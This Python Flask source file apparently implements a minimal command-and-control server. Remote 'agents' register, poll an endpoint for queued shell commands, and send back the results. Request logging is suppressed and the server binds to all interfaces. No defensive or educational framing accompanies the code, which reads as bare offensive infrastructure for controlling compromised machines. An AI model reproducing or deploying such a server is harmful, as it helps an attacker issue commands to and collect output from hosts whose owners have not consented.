from flask import Flask, jsonify, request
import logging

log = logging.getLogger("werkzeug")
log.setLevel(logging.ERROR) # No useless messages

agents = []
commands = []
app = Flask(__name__)

#
## APP ROUTES
#
@app.route("/new",methods=['GET'])
def app_new():
        agent_name = request.args['agent']
        if not agent_name in agents:
                agents.append(agent_name)
        return "ok", 200
@app.route("/cmd",methods=['GET'])
def app_cmd():
        agent_name = request.args['agent']
        for entry in commands:
                if entry['agent'] == agent_name:
                        cmd = entry['cmd']
                        uid = entry['id']
                        return jsonify({
                                'cmd':cmd,
                                'id':uid,
                                }), 200
        return "none", 200
@app.route("/res",methods=['GET'])
def app_res():
        uid = request.args['id']
        result = request.args['result']
        for entry in commands:
                if entry['id'] == uid:
                        entry['res'] = result
        return "ok", 200

def serve(ip="0.0.0.0",port=1029):
        app.run(host=ip,port=port)

